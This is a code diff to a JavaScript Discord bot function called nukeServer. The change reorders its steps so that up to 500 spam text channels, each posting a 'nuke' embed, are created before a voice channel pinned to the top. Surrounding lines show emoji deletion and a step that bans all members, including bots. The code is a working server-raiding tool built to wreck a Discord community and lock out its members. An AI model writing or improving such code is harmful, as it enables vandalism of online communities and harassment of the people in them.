@@ -119,29 +119,11 @@ export async function nukeServer(
     log.push(`😀 **Emojis** — deleted \`${succeeded}\`, failed \`${failed}\``);
   }
 
-  // 5. Voice Channel creation (if requested)
-  //    Reserve 1 slot from channelsToCreate for the VC; remaining go to text.
-  if (createVc) {
-    const textCount  = Math.max(channelsToCreate - 1, 0);
-    channelsToCreate = textCount; // hand-off to step 6
-    try {
-      vcChannel = await guild.channels.create({
-        name: vcName,
-        type: ChannelType.GuildVoice,
-        position: 0,
-      });
-      await vcChannel.setPosition(0, { relative: false }).catch(() => {});
-      // Post the nuke embed in the VC's built-in text chat
-      await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
-      log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created at top`);
-    } catch (err) {
-      log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
-    }
-  }
-
-  // 6. Spam channels creation + post nuke embed in each
-  if (channelsToCreate > 0) {
-    const count      = Math.min(channelsToCreate, 500);
+  // 5. Spam channels creation + post nuke embed in each
+  //    VC (if requested) is created AFTER these so it ends up at the top.
+  const textCount = createVc ? Math.max(channelsToCreate - 1, 0) : channelsToCreate;
+  if (textCount > 0) {
+    const count      = Math.min(textCount, 500);
     const embed      = buildNukeEmbed(channelName);
     const createTasks = Array.from({ length: count }, async () => {
       try {
@@ -155,6 +137,23 @@ export async function nukeServer(
     const succeeded = results.filter((r) => r.status === 'fulfilled').length;
     const failed    = results.filter((r) => r.status === 'rejected').length;
     log.push(`📣 **Spam Channels Created** — \`${succeeded}\` created, failed \`${failed}\``);
+  }
+
+  // 6. Voice Channel creation (if requested) — created LAST so position 0 places it first
+  if (createVc) {
+    try {
+      vcChannel = await guild.channels.create({
+        name: vcName,
+        type: ChannelType.GuildVoice,
+        position: 0,
+      });
+      await vcChannel.setPosition(0, { relative: false }).catch(() => {});
+      // Post the nuke embed in the VC's built-in text chat
+      await vcChannel.send({ embeds: [buildVcNukeEmbed()] }).catch(() => {});
+      log.push(`🔊 **Voice Channel** — \`${vcChannel.name}\` created at top`);
+    } catch (err) {
+      log.push(`🔊 **Voice Channel** — failed: \`${err.message}\``);
+    }
   }
 
   // 7. Members — BAN ALL (including bots), skip the bot itself only
